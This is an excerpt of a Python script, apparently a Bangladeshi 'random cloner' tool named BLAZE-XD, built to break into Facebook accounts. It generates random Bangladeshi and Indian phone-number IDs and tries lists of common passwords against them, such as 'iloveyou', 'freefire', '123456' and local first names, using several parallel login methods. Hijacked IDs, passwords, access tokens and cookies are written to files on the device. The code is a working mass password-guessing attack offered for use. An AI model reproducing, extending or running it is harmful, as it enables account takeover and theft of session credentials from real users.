...
print('PLEASE WAIT MODULE RUNNING....\n')
...
logo = ("""
 ...
 \x1b[38;5;50m██████  ███████ ██   ██ ███████ ███████ 
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ [B] AUTHOR    \x1b[38;5;46m: \x1b[38;5;46mABRARUL HOSSAIN FARHAN     ┃
┃ [L] FRIENDS   \x1b[38;5;47m: \x1b[38;5;47mMD JARIF X ARIYAN          ┃
┃ [A] FACEBOOK  \x1b[38;5;48m: \x1b[38;5;48mMD FARHAN                  ┃
┃ [Z] SYSTEM    \x1b[38;5;49m: \x1b[38;5;49mDATA & WIFI                ┃
┃ [E] GITHUB    \x1b[38;5;50m: \x1b[38;5;50mBLAZE-XD                   ┃
┃ [X] TOOLS     \x1b[38;5;46m: \x1b[38;5;46mFILE X RANDOM              ┃
┃ [D] VERSION   \x1b[38;5;47m: \x1b[38;5;47mX-0.2                      ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
def linex():
        print(f'{G}{GGG}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{G}')
def clear():
...
def menu():
  ...
  try:
    httpCaht = requests.get('https://github.com/Blaze0987/approval.txt/blob/main/Paid.txt').text    
    if id in httpCaht:
...
def menu_a():
			clear()
			os.system('xdg-open https://www.facebook.com/CH4P.M4STERM19ND')
			linex()
			...
			print(f'\x1b[1;92m{XX}[\x1b[1;92m4{XX}]\x1b[38;5;49m JOIN FACEBOOK GROUP ')
			print(f'\x1b[1;92m{XX}[\x1b[1;92m5{XX}]\x1b[38;5;50m FOLLOW ON GITHUB ')
			...
			if xd in ['1','01']:
				...
				RANDOM()
			elif xd in ['3','03']:os.system('xdg-open https://www.facebook.com/CH4P.M4STERM19ND');menu()
			elif xd in ['4','04']:os.system('xdg-open https://facebook.com/groups/224531970647969/');menu()
			elif xd in ['5','05']:os.system('xdg-open https://github.com/Blaze0987');menu()
			elif xd in ['0','00']:clear();print(f"\x1b[1;92m {XX}[\x1b[1;92m={XX}]\x1b[38;5;46m THANKS FOR USING ")
			
			

def RANDOM():
			clear()
			print(f'\x1b[1;92m{XX}[\x1b[1;92m1{XX}]\x1b[38;5;46m CRACK \x1b[1;92m{XX}[\x1b[1;92mBD{XX}]')
			print(f'\x1b[1;92m{XX}[\x1b[1;92m2{XX}]\x1b[38;5;46m CRACK \x1b[1;92m{XX}[\x1b[1;92mINDIA{XX}]')
			linex()
...
def api2(ids,names,passlist):
        try:
                ...
                sys.stdout.write(f'\r {bblack}[{G}BLAZE-M2{bblack}]-[{G}%s{bblack}]-[{G}OK:%s{bblack}]'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print(f'\r\r {bblack}[{G}BLAZE-OK{bblack}]{G} '+ids+' \033[1;30m|\033[1;32m '+pas+'\033[1;37m')
                                        open('/sdcard/BLAZE-FILE-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r\033[1;36m[BLAZE-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\033[1;30m[BLAZE-CP] '+ids+' | '+pas+'\033[1;97m')
...
def api1(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write(f'\r {bblack}[{G}BLAZE-M1{bblack}]-[{G}%s{bblack}]-[{G}OK:%s{bblack}]'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def RANDOMBD():
    ...
    print(f'\x1b[1;92m {XX}[\x1b[1;92m_{XX}]\x1b[38;5;46m EXAMPLE : {G}017 {X}| {G}019 {X}| {G}016 {X}| {G}018 {X}| {G}013')
    linex()
    ...
    clear()
    print(f'\x1b[1;92m {XX}[\x1b[1;92m1{XX}]\x1b[38;5;46m Method \x1b[1;92m{XX}[\x1b[1;92mUID LOG-IN{XX}]')
    print(f'\x1b[1;92m {XX}[\x1b[1;92m2{XX}]\x1b[38;5;46m Method \x1b[1;92m{XX}[\x1b[1;92mUID LOG-IN{XX}]')
    print(f'\x1b[1;92m {XX}[\x1b[1;92m3{XX}]\x1b[38;5;46m Method \x1b[1;92m{XX}[\x1b[1;92mCOOKIE LOG-IN{XX}]')
    linex()
    ...
    with tred(max_workers=30) as morshed:
        ...
        linex()
        for love in user:
            pwx = [love[2:],love,code+love,code+love[:3],'i love you','iloveyou','free fire','freefire','FreeFire','Free Fire','farhan','tamim','mababa','jarif','@@##','@@@###','@@@@####','77889900','১২৩৪৫৬','tasnim','sara','ahona','akash','123456','Bangladesh','bangladesh']
            ids = code+love
            if mthdx in ['1','1']:
...
def RANDOMIN():
    ...
    os.geteuid
    os.system("clear");print(logo)
    print(f'\x1b[1;92m {XX}[\x1b[1;92m={XX}]\x1b[38;5;46m EXAMPLE : {G}+91730 {X}| {G}+91720 {X}| {G}+91789 {G}+91620 {X}| {G}+91789 {X}| ')
    linex()
    code = input(f'\x1b[1;92m {XX}[\x1b[1;92m={XX}]\x1b[38;5;46m ENTER SIM CODE : ')
    doamin = ' BD Number id cloner [ONLY-OK] '
    cod ='+9163'
    ...
    with tred(max_workers=30) as morshed:
        ...
        linex()
        for love in user:
            pwx = [love[2:],love,code+love,code+love[:3],'57273200','59039200','57575751']
            ids = code+love
            if mthdx in ['1','1']:
            	morshed.submit(FIRE,ids,pwx,tl)
            if mthdx in ['2','2']:
...
def FIRE(ids,pwv,tl):
    ...
    sys.stdout.write(f'\r \033[1;90m[\033[1;92mBLAZE-M1\033[1;90m]-[{cl}{loop}\033[1;90m]-\033[1;90m[\033[1;92mOK:{len(oks)}\033[1;90m]');sys.stdout.flush()
    try:
        for pas in pwv:
            ...
            if 'access_token' in po:
                ...
                linex()
                open('/sdcard/BLAZE-RANDOM-M1-OK.txt','a').write(str(ids)+' | '+pas+' | '+kuki+'\n')
                oks.append(ids)
                break
            else:continue
        loop+=1
...
def FIREX(ids,pwv,tl):
    global loop,oks,cps,twf
    cl = random.choice([f'\033[1;91m','\033[1;92m','\033[1;94m','\033[1;95m','\033[1;96m','\033[1;97m','\033[1;90m'])
    sys.stdout.write(f'\r \033[1;90m[\033[1;92mBLAZE-M2\033[1;90m]-[{cl}{loop}\033[1;90m]-\033[1;90m[\033[1;92mOK:{len(oks)}\033[1;90m]');sys.stdout.flush()
    try:
        for pas in pwv:
            android_version=str(random.randrange(6,13))
            adid = str(uuid.uuid4())
            ...
            if 'access_token' in po:
                ...
                print(f'\r\r {bblack}[{G}•{bblack}]{G} '+kuki+'')
                linex()
                open('/sdcard/BLAZE-RANDOM-M2-OK.txt','a').write(str(ids)+' | '+pas+' | '+kuki+'\n')
                oks.append(ids)
                break
            else:continue
        loop+=1
...
def M3Z(ids,pwv,tl):
    global loop,oks,cps,twf
    cl = random.choice([f'\033[1;91m','\033[1;92m','\033[1;94m','\033[1;95m','\033[1;96m','\033[1;97m','\033[1;90m'])
    sys.stdout.write(f'\r \033[1;90m[\033[1;92mBLAZE-M3\033[1;90m]-[{cl}{loop}\033[1;90m]-\033[1;90m[\033[1;92mOK:{len(oks)}\033[1;90m]');sys.stdout.flush()
    try:
        for pas in pwv:
            android_version=str(random.randrange(6,13))
            adid = str(uuid.uuid4())
            ...
            if 'access_token' in po:
                ...
                print(f'\r\r {bblack}[{G}•{bblack}]{G} '+kuki+'')
                linex()
                open('/sdcard/BLAZE-RANDOM-M3-OK.txt','a').write(str(ids)+' | '+pas+' | '+kuki+'\n')
                oks.append(ids)
                break
            else:continue
        loop+=1
